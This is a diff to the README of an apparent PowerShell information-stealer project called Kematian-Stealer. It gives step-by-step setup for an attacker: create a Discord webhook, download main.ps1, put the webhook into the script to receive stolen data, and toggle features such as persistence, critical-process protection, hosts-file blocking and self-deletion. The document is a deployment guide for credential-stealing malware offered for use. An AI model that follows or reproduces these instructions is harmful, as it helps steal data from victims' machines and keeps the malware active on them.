@@ -36,21 +36,26 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 - After creating a server go to `Edit channel` > `Integrations` > `Webhooks` > `Create Webhook`
 - Copy the `Webhook URL`
 - Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
-- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `30` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
+- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `1` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
 - Additionally, set `$true` for the variables you wish to activate. Conversely, utilize `$false` to deactivate them, as shown in `configurations` below.
  
  > [!NOTE]   
- > **The debug option is for testing purposes only**
+ > **THE DEBUG OPTION IS FOR TESTING PURPOSES ONLY**
+ 
+> [!IMPORTANT]   
+ > **AVOID USING THE WEBHOOK LINE IN LINE `1` IF YOU NEED UPDATES DIRECTLY FROM THE REPOSITORY. INSTEAD MODIFY `AUTOUPDATE WEBHOOK` ON LINE `44` WITH YOUR DISCORD WEBHOOK.**
 
 ### Configurations
 ```ps1
+$webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
 $autoupdate = $false
 $blockhostsfile = $true
-$criticalprocess = $false
-$melt = $true
+$criticalprocess = $true
+$melt = $false
 $fakeerror = $false
 $persistence = $true
+
 ```
 
 # Requirements
